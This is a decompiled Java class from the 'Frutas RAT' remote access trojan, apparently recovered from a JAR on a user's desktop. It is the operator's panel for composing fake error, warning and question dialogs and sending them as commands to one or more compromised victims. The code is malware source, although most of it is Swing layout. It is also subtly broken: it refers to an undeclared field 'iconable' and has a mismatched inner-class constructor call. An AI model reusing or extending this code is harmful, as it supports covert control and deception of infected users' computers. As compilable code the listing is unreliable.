/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Component;
/*     */ import java.awt.Container;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.util.ResourceBundle;
/*     */ import javax.swing.DefaultComboBoxModel;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.ImageIcon;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JList;
/*     */ import javax.swing.JOptionPane;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JTextArea;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.ListCellRenderer;
/*     */ 
/*     */ public class GUIMensajes extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*     */   private Usuario[] user;
/*     */   private String titulop;
/*     */   private JTextArea cuerpo;
/*     */   private JButton jButton1;
/*     */   private JButton jButton3;
/*     */   private JLabel jLabel1;
/*     */   private JLabel jLabel2;
/*     */   private JScrollPane jScrollPane1;
/*     */   private JComboBox opcion;
/*     */   private JComboBox tipo;
/*     */   private JTextField titulo;
/*     */ 
/*     */   public GUIMensajes(Usuario[] us, ResourceBundle rb)
/*     */   {
/*  20 */     initComponents();
/*  21 */     this.tipo.setRenderer(new ItemPersonalizado(null));
/*     */ 
/*  26 */     this.user = us;
/*  27 */     if (this.user.length > 1) {
/*  28 */       setTitle(getTitle() + " Mensaje a " + us.length + " usuarios");
/*  29 */       this.titulop = (" Mensaje a " + us.length + " usuarios");
/*     */     } else {
/*  31 */       setTitle(getTitle() + this.user[0].getIdentificador());
/*  32 */       this.titulop = this.user[0].getIdentificador();
/*     */     }
/*     */ 
/*  35 */     changeLenguage(rb);
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  47 */     this.tipo = new JComboBox();
/*  48 */     this.jLabel1 = new JLabel();
/*  49 */     this.titulo = new JTextField();
/*  50 */     this.jLabel2 = new JLabel();
/*  51 */     this.jScrollPane1 = new JScrollPane();
/*  52 */     this.cuerpo = new JTextArea();
/*  53 */     this.jButton1 = new JButton();
/*  54 */     this.opcion = new JComboBox();
/*  55 */     this.jButton3 = new JButton();
/*     */ 
/*  57 */     setClosable(true);
/*  58 */     setIconifiable(true);
/*  59 */     setTitle("Mensajes Fakes: ");
/*     */ 
/*  61 */     this.tipo.setModel(new DefaultComboBoxModel(new String[] { "Error", "Informacion", "Advertencia", "Pregunta" }));
/*     */ 
/*  63 */     this.jLabel1.setFont(new Font("Arial Black", 0, 12));
/*  64 */     this.jLabel1.setForeground(new Color(0, 102, 51));
/*  65 */     this.jLabel1.setText("Titulo");
/*     */ 
/*  67 */     this.titulo.setFont(new Font("Arial Black", 0, 11));
/*  68 */     this.titulo.setForeground(new Color(0, 0, 153));
/*  69 */     this.titulo.setText("Frutas RAT v0.8");
/*     */ 
/*  71 */     this.jLabel2.setFont(new Font("Arial Black", 0, 12));
/*  72 */     this.jLabel2.setForeground(new Color(0, 102, 51));
/*  73 */     this.jLabel2.setText("Cuerpo");
/*     */ 
/*  75 */     this.cuerpo.setColumns(20);
/*  76 */     this.cuerpo.setFont(new Font("Arial Black", 0, 12));
/*  77 */     this.cuerpo.setRows(5);
/*  78 */     this.cuerpo.setText("Sabes cual es tu propósito en esta vida...?");
/*  79 */     this.jScrollPane1.setViewportView(this.cuerpo);
/*     */ 
/*  81 */     this.jButton1.setText("Prueba");
/*  82 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  84 */         GUIMensajes.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/*  88 */     this.opcion.setModel(new DefaultComboBoxModel(new String[] { "YES_NO_OPTION        ", "YES_NO_CANCEL_OPTION", "OK_CANCEL_OPTION" }));
/*     */ 
/*  90 */     this.jButton3.setIcon(new ImageIcon(getClass().getResource("/resources/style_edit.png")));
/*  91 */     this.jButton3.setText("Enviar");
/*  92 */     this.jButton3.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  94 */         GUIMensajes.this.jButton3ActionPerformed(evt);
/*     */       }
/*     */     });
/*  98 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  99 */     getContentPane().setLayout(layout);
/* 100 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jLabel1).addComponent(this.titulo).addComponent(this.jLabel2).addComponent(this.jScrollPane1, -1, 336, 32767)).addGap(0, 0, 32767)).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addComponent(this.jButton3, -1, -1, 32767).addGap(75, 75, 75).addComponent(this.jButton1)).addGroup(layout.createSequentialGroup().addComponent(this.tipo, -2, 135, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 44, 32767).addComponent(this.opcion, -2, 158, -2))).addContainerGap()));
/*     */ 
/* 122 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.tipo, -2, -1, -2).addComponent(this.opcion, -2, -1, -2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.titulo, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jScrollPane1, -2, 115, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jButton1).addComponent(this.jButton3, -1, -1, 32767)).addContainerGap()));
/*     */ 
/* 144 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt)
/*     */   {
/* 155 */     JOptionPane.showOptionDialog(null, this.cuerpo.getText(), this.titulo.getText(), this.opcion.getSelectedIndex(), this.tipo.getSelectedIndex(), null, null, Boolean.valueOf(this.iconable));
/*     */   }
/*     */ 
/*     */   private void jButton3ActionPerformed(ActionEvent evt)
/*     */   {
/* 160 */     String tst = this.tipo.getSelectedIndex() + "#" + this.opcion.getSelectedIndex() + "#" + this.titulo.getText() + "#" + this.cuerpo.getText();
/*     */ 
/* 163 */     for (int i = 0; i < this.user.length; i++)
/* 164 */       this.user[i].sendComando(1, tst);
/*     */   }
/*     */ 
/*     */   public final void changeLenguage(ResourceBundle rb)
/*     */   {
/* 185 */     setTitle(rb.getString("mensaje.titulo") + this.titulop);
/* 186 */     this.tipo.removeAllItems();
/* 187 */     JLabel a = new JLabel(rb.getString("mensaje.error"));
/* 188 */     a.setIcon(new ImageIcon(getClass().getResource("/resources/0.gif")));
/* 189 */     this.tipo.addItem(a);
/* 190 */     a = new JLabel(rb.getString("mensaje.informacion"));
/* 191 */     a.setIcon(new ImageIcon(getClass().getResource("/resources/1.gif")));
/* 192 */     this.tipo.addItem(a);
/* 193 */     a = new JLabel(rb.getString("mensaje.advertencia"));
/* 194 */     a.setIcon(new ImageIcon(getClass().getResource("/resources/2.gif")));
/* 195 */     this.tipo.addItem(a);
/* 196 */     a = new JLabel(rb.getString("mensaje.pregunta"));
/* 197 */     a.setIcon(new ImageIcon(getClass().getResource("/resources/3.gif")));
/* 198 */     this.tipo.addItem(a);
/*     */ 
/* 200 */     this.jLabel1.setText(rb.getString("mensaje.titulo.texto"));
/* 201 */     this.jLabel2.setText(rb.getString("mensaje.cuerpo"));
/*     */ 
/* 203 */     this.jButton3.setText(rb.getString("mensaje.enviar"));
/* 204 */     this.jButton1.setText(rb.getString("mensaje.prueba"));
/*     */   }
/*     */ 
/*     */   private class ItemPersonalizado implements ListCellRenderer {
/*     */     private ItemPersonalizado() {
/*     */     }
/*     */ 
/*     */     public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) {
/* 212 */       JLabel l = (JLabel)value;
/*     */ 
/* 216 */       l.setOpaque(true);
/*     */ 
/* 218 */       if (isSelected) {
/* 219 */         l.setBackground(list.getSelectionBackground());
/* 220 */         l.setForeground(list.getSelectionForeground());
/*     */       } else {
/* 222 */         l.setBackground(list.getBackground());
/* 223 */         l.setForeground(list.getForeground());
/*     */       }
/* 225 */       return l;
/*     */     }
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.GUIMensajes
 * JD-Core Version:    0.6.2
 */